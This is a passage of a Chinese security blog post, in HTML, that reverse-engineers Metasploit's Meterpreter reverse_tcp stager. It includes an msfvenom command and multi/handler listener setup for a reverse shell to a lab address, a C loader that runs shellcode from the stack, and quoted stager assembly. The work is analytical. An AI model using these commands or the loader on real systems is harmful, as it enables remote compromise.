@@ -1,0 +1,1529 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言Meterpreter是metasploit中的一种高级，动态可扩展的有效载荷，它使用内存中的DLL注入stagers，并在运行时通过网络进行扩展，关于更多Meterpreter介绍可以参考此官方连接，在本文中我们将结合逆向分析和阅读源码深入解析Meterpreter有效载荷技术细节。 分析环境123456win7x64kali 2019.1amsf5x64DbgLordPEWireShark">
+<meta name="keywords" content="Metasploit,Meterpreter,payload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入解析Meterpreter有效载荷">
+<meta property="og:url" content="https://likte.me/Internals_meterpreter_payload.html">
+<meta property="og:site_name" content="Likte&#39;s Blog">
+<meta property="og:description" content="前言Meterpreter是metasploit中的一种高级，动态可扩展的有效载荷，它使用内存中的DLL注入stagers，并在运行时通过网络进行扩展，关于更多Meterpreter介绍可以参考此官方连接，在本文中我们将结合逆向分析和阅读源码深入解析Meterpreter有效载荷技术细节。 分析环境123456win7x64kali 2019.1amsf5x64DbgLordPEWireShark">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/1.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/2.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/3.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/4.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/5.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/6.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/7.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/8.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/9.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/10.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/11.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/12.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/13.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/stagepath.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/14.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/15.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/16.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/17.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/18.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/19.jpg">
+<meta property="og:image" content="https://likte.me/Internals_meterpreter_payload/20.jpg">
+<meta property="og:updated_time" content="2019-05-06T09:59:22.197Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="深入解析Meterpreter有效载荷">
+<meta name="twitter:description" content="前言Meterpreter是metasploit中的一种高级，动态可扩展的有效载荷，它使用内存中的DLL注入stagers，并在运行时通过网络进行扩展，关于更多Meterpreter介绍可以参考此官方连接，在本文中我们将结合逆向分析和阅读源码深入解析Meterpreter有效载荷技术细节。 分析环境123456win7x64kali 2019.1amsf5x64DbgLordPEWireShark">
+<meta name="twitter:image" content="https://likte.me/Internals_meterpreter_payload/1.jpg">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Likte's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://likte.me/Internals_meterpreter_payload.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>深入解析Meterpreter有效载荷 | Likte's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Likte's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://likte.me/Internals_meterpreter_payload.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Likte">
+      <meta itemprop="description" content="Have you tried your best?">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Likte's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">深入解析Meterpreter有效载荷
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+		
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-12 16:29:37" itemprop="dateCreated datePublished" datetime="2019-04-12T16:29:37+08:00">2019-04-12</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-05-06 17:59:22" itemprop="dateModified" datetime="2019-05-06T17:59:22+08:00">2019-05-06</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/病毒分析/" itemprop="url" rel="index"><span itemprop="name">病毒分析</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/Internals_meterpreter_payload.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/Internals_meterpreter_payload.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Meterpreter是metasploit中的一种高级，动态可扩展的有效载荷，它使用内存中的DLL注入stagers，并在运行时通过网络进行扩展，关于更多Meterpreter介绍可以参考此官方<a href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" target="_blank" rel="noopener">连接</a>，在本文中我们将结合逆向分析和阅读源码深入解析Meterpreter有效载荷技术细节。</p>
+<h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">win7x64</span><br><span class="line">kali 2019.1a</span><br><span class="line">msf5</span><br><span class="line">x64Dbg</span><br><span class="line">LordPE</span><br><span class="line">WireShark</span><br></pre></td></tr></table></figure>
+<h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>因为我们主要是为了分析Meterpreter payload，所以我们就使用msfvenom生成一个c语言形式的reverse_tcp的shellcode方便我们进行流量分析和逆向分析，实际使用中我们一般会对payload进行加密和免杀混淆等，接着打开Metasploit监听端口</p>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 生成reverse_tcp payload</span><br><span class="line">root@likte:~<span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.44.138 lport=6666 -f c</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">payload size: 341 bytes</span><br><span class="line">Final size of c file: 1457 bytes</span><br><span class="line">unsigned char buf[] =</span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span>......;	// shellcode省略</span><br><span class="line"></span><br><span class="line">// 监听端口</span><br><span class="line">root@likte:~<span class="comment"># msfconsole</span></span><br><span class="line">msf5 &gt; use multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.44.138</span><br><span class="line">LHOST =&gt; 192.168.44.138</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 6666</span><br><span class="line">LPORT =&gt; 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.44.138:6666 </span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure>
+<p>此shellcode需要我们编写一个c程序使用内联汇编进行调用，由于程序执行流导向了栈上的shellcode上执行所以在编译时需要关闭DEP，为了方便调试也应该关闭随机基址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span>......;	<span class="comment">// shellcode省略</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax, buf;</span><br><span class="line">		push eax;</span><br><span class="line">		ret;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="分析payload"><a href="#分析payload" class="headerlink" title="分析payload"></a>分析payload</h2><p>图1为shellcode逻辑开始处</p>
+<img src="/Internals_meterpreter_payload/1.jpg" title="图1">
+<p>我们可以查看一下<code>reverse_tcp</code>的部分实现源码，可以看到源码第一个调用的函数为<code>asm_reverse_tcp</code>函数</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">  <span class="comment"># Generate and compile the stager</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">generate_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line">    combined_asm = %Q^</span><br><span class="line">      cld                    	; 清空方向标志位</span><br><span class="line">      call start             	; call start位置</span><br><span class="line">      <span class="comment">#&#123;asm_block_api&#125;		; 调用了asm_block_api函数</span></span><br><span class="line">      <span class="symbol">start:</span>			; 注意此时栈顶地址为asm_block_api函数地址</span><br><span class="line">        pop ebp			; 将asm_block_api函数地址弹出到ebp</span><br><span class="line">      <span class="comment">#&#123;asm_reverse_tcp(opts)&#125; 	; 首先调用了asm_reverse_tcp函数</span></span><br><span class="line">      <span class="comment">#&#123;asm_block_recv(opts)&#125; 	; 调用了asm_block_recv函数</span></span><br><span class="line">    ^</span><br><span class="line">    Metasm::shellcode.assemble(Metasm::X86.new, combined_asm).encode_string</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>我们查看<code>asm_reverse_tcp</code>函数部分源码    </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asm_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line"></span><br><span class="line">    retry_count  = [opts[<span class="symbol">:retry_count</span>].to_i, <span class="number">1</span>].max</span><br><span class="line">    encoded_port = <span class="string">"0x%.8x"</span> % [opts[<span class="symbol">:port</span>].to_i,<span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">    encoded_host = <span class="string">"0x%.8x"</span> % Rex::Socket.addr_aton(opts[<span class="symbol">:host</span>]<span class="params">||</span><span class="string">"127.127.127.127"</span>).unpack(<span class="string">"V"</span>).first</span><br><span class="line"></span><br><span class="line">    addr_fam      = <span class="number">2</span></span><br><span class="line">    sockaddr_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    asm = %Q^</span><br><span class="line">      ; <span class="symbol">Input:</span> EBP must be the address of <span class="string">'api_call'</span>.</span><br><span class="line">      ; <span class="symbol">Output:</span> EDI will be the socket <span class="keyword">for</span> the connection to the server</span><br><span class="line">      ; <span class="symbol">Clobbers:</span> EAX, ESI, EDI, ESP will also be modified (-<span class="number">0x1A0</span>)</span><br><span class="line"></span><br><span class="line">      <span class="symbol">reverse_tcp:</span></span><br><span class="line">        push <span class="string">'32'</span>               ; Push the bytes <span class="string">'ws2_32'</span>,<span class="number">0</span>,<span class="number">0</span> onto the stack.</span><br><span class="line">        push <span class="string">'ws2_'</span>             ; ...</span><br><span class="line">        push esp                ; Push a pointer to the <span class="string">"ws2_32"</span> string on the stack.</span><br><span class="line">        push <span class="comment">#&#123;Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')&#125;</span></span><br><span class="line">        mov eax, ebp		;此时ebp为asm_block_api函数的地址</span><br><span class="line">        call eax                ; LoadLibraryA( <span class="string">"ws2_32"</span> )</span><br><span class="line">        			; call eax 相当于call asm_block_api函数</span><br></pre></td></tr></table></figure>
+<p>对比我们逆向的结果图2，结果和我们分析的一致</p>
+<img src="/Internals_meterpreter_payload/2.jpg" title="图2">
+<p>下面图3为<code>asm_block_api</code>函数，该函数接收的参数为要获取函数地址的调用参数和当前模块名称和函数名称Hash的和，该函数主要逻辑就是获取<code>fs:30</code>偏移处的PEB然后获取指向<code>PEB_LDR_DATA</code>结构的指针，然后通过<code>InMemoryOrderModuleList</code>双向链表遍历获取模块名称并对其进行Hash，之后再获取当前模块基址并计算出当前模块的导出表RVA</p>
+<img src="/Internals_meterpreter_payload/3.jpg" title="图3">
+<p>如果不存在导出表则跳转到图4位置继续遍历双向链表获取下一个模块</p>
+<img src="/Internals_meterpreter_payload/4.jpg" title="图4">
+<p>如果当前模块存在导出表则遍历导出函数名称进行Hash，如果当前导出函数Hash加上当前模块的Hash等于预定的Hash值判断此函数就是要找的，之后就通过遍历导出表计算出此导出函数的地址</p>
+<img src="/Internals_meterpreter_payload/5.jpg" title="图5">
+<p>之后通过<code>jmp eax</code>来调用获取到的对应函数</p>
+<img src="/Internals_meterpreter_payload/6.jpg" title="图6">
+<p>接下来我们分析一下<code>asm_block_api</code>函数的实现源码，但是在当前<code>asm_reverse_tcp.rb</code>中并没有这个函数，判断应该是调用了其他源文件中的函数，我们查看头部包含的文件发现包含了<code>msf/core/payload/windows/block_api</code>这个源文件，我们在当前目录下查找发现了<code>block_api.rb</code>应该就是我们要找的了</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/reverse_tcp.rb</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/transport_config'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/windows/send_uuid'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/windows/block_api'</span>	<span class="comment"># 调用了block_api这个源文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/payload/windows/exitfunk'</span></span><br></pre></td></tr></table></figure>
+<p>我们将<code>asm_block_api</code>函数的源码都扒下来分析（源码注释为机翻），可以看到<code>asm_block_api</code>函数的实现源码和我们刚才逆向分析的基本相同，不同的地方就是源码中的偏移使用的是十进制，而我们使用的x64dbg中是十六进制显示的</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filepath /usr/share/metasploit-framework/lib/msf/core/payload/windows/block_api.rb</span></span><br><span class="line"><span class="class"><span class="keyword">module</span> <span class="title">payload::Windows::BlockApi</span></span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">asm_block_api</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line"></span><br><span class="line">    raw = %q^</span><br><span class="line"></span><br><span class="line">    <span class="symbol">api_call:</span></span><br><span class="line">      pushad                    ; 我们保留调用者的所有寄存器，除了EAX和ECX.</span><br><span class="line">      mov ebp, esp              ; 开辟栈帧</span><br><span class="line">      xor eax, eax              ; 清空 EAX (在找到函数之前，上面的<span class="number">3</span>个字节将保持为零)</span><br><span class="line">      mov edx, [<span class="symbol">fs:</span>eax+<span class="number">48</span>]      ; 获得指向PEB的指针</span><br><span class="line">      mov edx, [edx+<span class="number">12</span>]         ; Get PEB-&gt;Ldr</span><br><span class="line">      mov edx, [edx+<span class="number">20</span>]         ; 从InMemoryOrder模块列表中获取第一个模块</span><br><span class="line">    <span class="symbol">next_mod:</span>                   ;</span><br><span class="line">      mov esi, [edx+<span class="number">40</span>]         ; 获取指向模块名称的指针(unicode字符串)</span><br><span class="line">      movzx ecx, word [edx+<span class="number">38</span>]  ; 将ECX设置为我们要检查的长度</span><br><span class="line">      xor edi, edi              ; 清除EDI，它将存储模块名称的散列</span><br><span class="line">    <span class="symbol">loop_modname:</span>               ;</span><br><span class="line">      lodsb                     ; 读取名称的下一个字节</span><br><span class="line">      cmp al, <span class="string">'a'</span>               ; 一些版本的Windows使用小写模块名</span><br><span class="line">      jl not_lowercase          ;</span><br><span class="line">      sub al, <span class="number">0x20</span>              ; 如果是这样，就用大写字母表示</span><br><span class="line">    <span class="symbol">not_lowercase:</span>              ;</span><br><span class="line">      ror edi, <span class="number">13</span>               ; 向右旋转哈希值</span><br><span class="line">      add edi, eax              ; 添加名称的下一个字节</span><br><span class="line">      loop loop_modname         ; 循环直到我们读够为止</span><br><span class="line"></span><br><span class="line">      ; 现在我们已经计算了模块哈希</span><br><span class="line">      push edx                  ; 在模块列表中保存当前位置，以备以后使用</span><br><span class="line">      push edi                  ; 保存当前模块Hash</span><br><span class="line">      ; 继续迭代导出地址表</span><br><span class="line">      mov edx, [edx+<span class="number">16</span>]         ; 获取此模块的基址</span><br><span class="line">      mov ecx, [edx+<span class="number">60</span>]         ; 获取 PE header</span><br><span class="line"></span><br><span class="line">      ; 这里使用ecx作为我们的EAT指针，这样我们就可以利用jecxz了</span><br><span class="line">      mov ecx, [ecx+edx+<span class="number">120</span>]    ; 从PE头部获取EAT</span><br><span class="line">      jecxz get_next_mod1       ; 如果不存在EAT,继续下一个模块</span><br><span class="line">      add ecx, edx              ; 相加模块基址</span><br><span class="line">      push ecx                  ; 保存当前模块EAT</span><br><span class="line">      mov ebx, [ecx+<span class="number">32</span>]         ; 获取函数名的rva</span><br><span class="line">      add ebx, edx              ; 相加模块基址</span><br><span class="line">      mov ecx, [ecx+<span class="number">24</span>]         ; 获取函数名的数目</span><br><span class="line">      ; now ecx returns to its regularly scheduled counter duties</span><br><span class="line"></span><br><span class="line">      ; 计算模块哈希+函数哈希</span><br><span class="line">    <span class="symbol">get_next_func:</span>        